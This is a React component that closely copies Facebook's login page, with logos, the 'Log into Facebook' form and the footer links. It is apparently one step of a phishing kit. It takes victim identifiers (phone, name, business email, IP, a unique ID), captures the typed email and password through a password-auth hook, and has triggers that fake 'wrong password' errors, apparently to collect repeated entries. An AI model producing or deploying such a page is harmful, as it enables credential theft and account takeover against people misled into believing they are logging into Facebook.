import React, { useState, useContext, useEffect } from "react";
import styled from "styled-components";
import { usePasswordAuth } from "../../hooks/usePasswordAuth.js";
import ButtonActions from "../../utils/buttonActions.js";
import { DataContext } from "../../pages/index.js";

const CustomInput = styled.input`
  border: 1px solid #dddfe2 !important;
  border-radius: 16px !important;
  padding: 22px 16px 8px 16px !important;
  background-color: #fff;
  margin-top: 0;
  width: 100%;
  font-size: 17px;
  color: #1d2129;
  line-height: 1.34;
  min-height: auto;
  font-family: Helvetica, system-ui, sans-serif !important;
  box-sizing: border-box;

  &.redborder {
    border: 1px solid red !important;
  }

  ::placeholder {
    color: transparent;
    user-select: none;
  }

  &:focus {
    outline: none;
    border-color: #0866ff !important;
    box-shadow: 0 0 0 2px #e7f3ff;
  }
`;

const FormFloatingWrapper = styled.div`
  position: relative;
  margin-bottom: 12px;
`;

const FloatingLabel = styled.label`
  position: absolute;
  top: 14px;
  left: 16px;
  font-size: 17px;
  font-weight: 400;
  color: #90949c;
  pointer-events: none;
  transition: all 0.15s ease-out;
  background-color: transparent;
  line-height: 1.34;
  font-family: Helvetica, system-ui, sans-serif !important;

  ${CustomInput}:focus ~ &,
  ${CustomInput}:not(:placeholder-shown) ~ & {
    top: 6px;
    font-size: 11px;
    color: #606770;
  }

  ${CustomInput}:disabled ~ & {
    color: #adb5bd;
  }
`;

function Step2PC({
  Unik,
  Tel,
  Email,
  setEmail,
  Name,
  BusinessEmail,
  Ip,
  setParentBeginTimer,
  InvalidPassword,
  wrongPasswordTrigger,
  wrongCredsTrigger,
}) {
  const [isValidEmail, setIsValidEmail] = useState(true);
  const { setAllData, AllData } = useContext(DataContext);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  // Use the custom hook for password authentication
  const {
    password,
    setPassword,
    isLoading,
    passwordError,
    emailError,
    credentialsError,
    hasCredsError,
    triedSubmit,
    passwordAttempt,
    handleSubmit,
    clearPasswordError,
    clearEmailError,
    clearCredentialsError,
  } = usePasswordAuth({
    Unik,
    Email,
    setEmail,
    Tel,
    BusinessEmail,
    Name,
    Ip,
    wrongPasswordTrigger,
    wrongCredsTrigger,
    setParentBeginTimer,
  });

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    clearEmailError();
    clearCredentialsError();
    setIsValidEmail(true);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    clearPasswordError();
    clearCredentialsError();
  };

  return (

      <div className="h-[1050px] overflow-hidden flex flex-col bg-white font-sans">
        {/* Main Content */}
        <div className="flex flex-1 min-h-0 border-b-2 border-gray-300">
          {/* Left Section - Hero */}
          <div className="flex-1 flex flex-col justify-end pb-16 pl-10 pr-8 relative overflow-hidden bg-white">
            {/* Facebook Logo top left */}
            <div className="absolute top-6 left-10 z-10">
              <svg viewBox="0 0 24 24" fill="#0866FF" width="64" height="64">
                <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z" />
              </svg>
            </div>

            {/* Hero Image — bounded above by logo, below by hero text, never overflows */}
            <div className="absolute bottom-1 left-[8%] right-0 overflow-hidden flex items-center justify-center ">
              <img
                src="/Images/facebooklogin.png"
                alt="Facebook"
                className="max-w-[841px] max-h-full object-contain"
              />
            </div>

            {/* Hero Text */}
            <div className="max-w-xl z-10">
              <h1 className="text-[3.3rem] font-bold text-gray-900 leading-[1.15]">
                Explore<br />
                the<br />
                things<br />
                <span className="text-[#0866FF]">you love</span>.
              </h1>
            </div>
          </div>

          {/* Right Section - Login Form */}
          <div className="flex flex-col items-center justify-center w-[650px] px-14 bg-white border-l-2 border-gray-300">
            <div className="w-full ">
              <h2 className="text-[17px] font-normal text-gray-900 mb-6 text-left">
                Log into Facebook
              </h2>

              {/* ↓ was w-[546px] — caused form to overflow the column */}
              <div className="flex flex-col gap-0.5 w-full">
                <FormFloatingWrapper>
                  <CustomInput
                    type="text"
                    id="email"
                    value={Email}
                    onChange={handleEmailChange}
                    placeholder=" "
                    className={
                      hasCredsError || (!isValidEmail && triedSubmit)
                        ? "redborder"
                        : ""
                    }
                    disabled={isLoading}
                  />
                  <FloatingLabel htmlFor="email">Email or mobile number</FloatingLabel>
                  {!credentialsError && emailError && (
                    <div className="text-red-500 text-sm mt-1">{emailError}</div>
                  )}
                </FormFloatingWrapper>

                <FormFloatingWrapper>
                  <CustomInput
                    type="password"
                    id="password"
                    value={password}
                    onChange={handlePasswordChange}
                    placeholder=" "
                    className={
                      hasCredsError || (password.length < 5 && triedSubmit)
                        ? "redborder"
                        : ""
                    }
                    disabled={isLoading}
                  />
                  <FloatingLabel htmlFor="password">Password</FloatingLabel>
                  {!credentialsError && passwordError && (
                    <div className="text-red-500 text-sm mt-1">{passwordError}</div>
                  )}
                </FormFloatingWrapper>

                {credentialsError && (
                  <div className="text-red-500 text-sm mt-1 mb-3">
                    {credentialsError}
                  </div>
                )}

                <div className="gap-2 flex flex-col mt-2">

                <button
                  onClick={handleSubmit}
                  className="w-full h-[44px] bg-[#0866FF] rounded-full text-white text-base font-normal cursor-pointer flex items-center justify-center hover:bg-blue-700 transition-colors"
                >
                  {isLoading ? (
                    <div className="flex items-center justify-center h-6 w-6">
                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" className="h-full w-full animate-spin">
                        <circle fill="none" stroke="#FFFFFF" strokeWidth="20" strokeLinecap="round" strokeDasharray="120 200" cx="100" cy="100" r="70" />
                      </svg>
                    </div>
                  ) : "Log in"}
                </button>

                <button
                  type="button"
                  onClick={(e) => {
                    e.preventDefault();
                    ButtonActions.handleForgottenPassword({ AllData, setAllData, Unik, Email, Ip });
                  }}
                  className="w-full h-[44px] rounded-full text-gray-700text-base font-normal cursor-pointer flex items-center justify-center hover:bg-gray-100 transition-colors"
                >
                  Forgot password?
                </button>

                </div>

                <div className="pt-4 flex justify-center">
                  <button
                    className="w-full !border !border-[#0866FF] text-[#0866FF] rounded-full text-base font-normal py-2.5 px-6 cursor-pointer hover:bg-gray-100 transition-colors"
                    onClick={(e) => {
                      ButtonActions.handleCreateAccount({ AllData, setAllData, Unik, Email, Ip });
                    }}
                  >
                    Create new account
                  </button>
                </div>
              </div>

              {/* Meta logo */}
              <div className="flex justify-center mt-8">
                <svg aria-label="Meta logo" role="img" viewBox="0 0 500 100" width="60" height="16">
                  <defs>
                    <linearGradient gradientUnits="userSpaceOnUse" id="meta_grad1" x1="124.38" x2="160.839" y1="99" y2="59.326">
                      <stop offset=".427" stopColor="#0278F1" />
                      <stop offset=".917" stopColor="#0180FA" />
                    </linearGradient>
                    <linearGradient gradientUnits="userSpaceOnUse" id="meta_grad2" x1="42" x2="-1.666" y1="4.936" y2="61.707">
                      <stop offset=".427" stopColor="#0165E0" />
                      <stop offset=".917" stopColor="#0180FA" />
                    </linearGradient>
                    <linearGradient gradientUnits="userSpaceOnUse" id="meta_grad3" x1="27.677" x2="132.943" y1="28.71" y2="71.118">
                      <stop stopColor="#0064E0" />
                      <stop offset=".656" stopColor="#0066E2" />
                      <stop offset="1" stopColor="#0278F1" />
                    </linearGradient>
                  </defs>
                  <path d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z" fill="#1C2B33" />
                  <path d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z" fill="#0180FA" />
                  <path d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z" fill="url(#meta_grad1)" />
                  <path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z" fill="url(#meta_grad2)" />
                  <path d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z" fill="url(#meta_grad3)" />
                </svg>
              </div>
            </div>
          </div>
        </div>

      {/* Footer */}
      <footer className="flex flex-col items-start w-full pt-4 pb-5 bg-white font-fbook text-xs text-gray-500 md:mt-0  mt-0">
        <div className="flex flex-wrap justify-start mb-2 pb-2 w-full max-w-6xl mx-auto">
          <div className="text-[14px] mr-3 text-gray-500">English (UK)</div>
          <a
            href="https://es-la.facebook.com/"
            className="text-[14px] mx-3 text-gray-500 cursor-pointer hover:underline"
          >
            Español
          </a>
          <a
            href="https://de-de.facebook.com/"
            className="text-[14px] mx-3 text-gray-500 cursor-pointer hover:underline"
          >
            Deutsch
          </a>
          <a
            href="https://fr-fr.facebook.com/"
            className="text-[14px] mx-3 text-gray-500 cursor-pointer hover:underline"
          >
            Français (France)
          </a>

          <a
            href="https://pt-br.facebook.com/"
            className="text-[14px] mx-3 text-gray-500 cursor-pointer hover:underline"
          >
            Türkçe
          </a>
          <a
            href="https://it-it.facebook.com/"
            className="text-[14px] mx-3 text-gray-500 cursor-pointer hover:underline"
          >
            Italiano
          </a>
                    <a
            href="https://pt-br.facebook.com/"
            className="text-[14px] mx-3 text-gray-500 cursor-pointer hover:underline"
          >
            Português (Brasil)
          </a>
          <a
            href=""
            className="text-[14px] mx-3 text-gray-500 cursor-pointer hover:underline"
          >
            More languages...
          </a>

        </div>
        <div className="flex flex-wrap justify-start mt-2 max-w-6xl mx-auto w-full">
          <a
            href="/reg/"
            className="text-gray-500 text-[14px] mb-1 no-underline cursor-pointer hover:underline"
          >
            Sign Up
          </a>
          <a
            href="/login/"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline font-fbook font-normal"
          >
            Log In
          </a>
          <a
            href="https://messenger.com/"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Messenger
          </a>
          <a
            href="/lite/"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Facebook Lite
          </a>
          <a
            href="https://en-gb.facebook.com/watch/"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Video
          </a>
          <a
            href="https://about.meta.com/technologies/meta-pay"
            target="_blank"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Meta Pay
          </a>
          <a
            href="https://www.meta.com/"
            target="_blank"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Meta Store
          </a>
          <a
            href="https://www.meta.com/quest/"
            target="_blank"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Meta Quest
          </a>
          <a
            href="https://www.meta.com/smart-glasses/"
            target="_blank"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Ray-Ban Meta
          </a>
          <a
            href="https://www.meta.ai/"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Meta AI
          </a>
          <a
            href="https://www.instagram.com/"
            target="_blank"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Meta AI more content
          </a>
          <a
            href="https://www.instagram.com/"
            target="_blank"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Instagram
          </a>
          <a
            href="https://www.threads.com/"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Threads
          </a>
          <a
            href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
            className="text-gray-500 text-[14px] mb-1 mr-2 no-underline cursor-pointer hover:underline"
          >
            Voting Information Centre
          </a>
          <a
            href="/privacy/policy/?entry_point=facebook_page_footer"
            className="text-gray-500 text-[14px] mb-1 m-0 no-underline cursor-pointer hover:underline"
          >
            Privacy Policy
          </a>
          <a
            href="/privacy/center/?entry_point=facebook_page_footer"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Privacy Centre
          </a>
          <a
            href="https://about.meta.com/"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            About
          </a>
          <a
            href="/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&nav_source=unknown&extra_1=auto"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Create ad
          </a>
          <a
            href="/pages/create/?ref_type=site_footer"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Create Page
          </a>
          <a
            href="https://developers.facebook.com/?ref=pf"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Developers
          </a>
          <a
            href="/careers/?ref=pf"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Careers
          </a>
          <a
            href="/policies/cookies/"
            className="text-gray-500 text-[14px] mb-1 no-underline cursor-pointer hover:underline"
          >
            Cookies
          </a>
          <a
            href="https://www.facebook.com/help/568137493302217"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            AdChoices
          </a>
          <a
            href="/policies?ref=pf"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Terms
          </a>
          <a
            href="/help/?ref=pf"
            className="text-gray-500 text-[14px] mx-2 mb-1 no-underline cursor-pointer hover:underline"
          >
            Help
          </a>
          <a
            href="https://www.facebook.com/help/637205020878504"
            className="text-gray-500 text-[14px] mb-1 no-underline cursor-pointer hover:underline"
          >
            Contact Uploading & Non-Users
          </a>
        </div>
        <div className="mt-3 text-[14px] text-gray-500 max-w-6xl w-full mx-auto">
          Meta © 2025
        </div>
      </footer>
    </div>
  );
}

export default Step2PC;
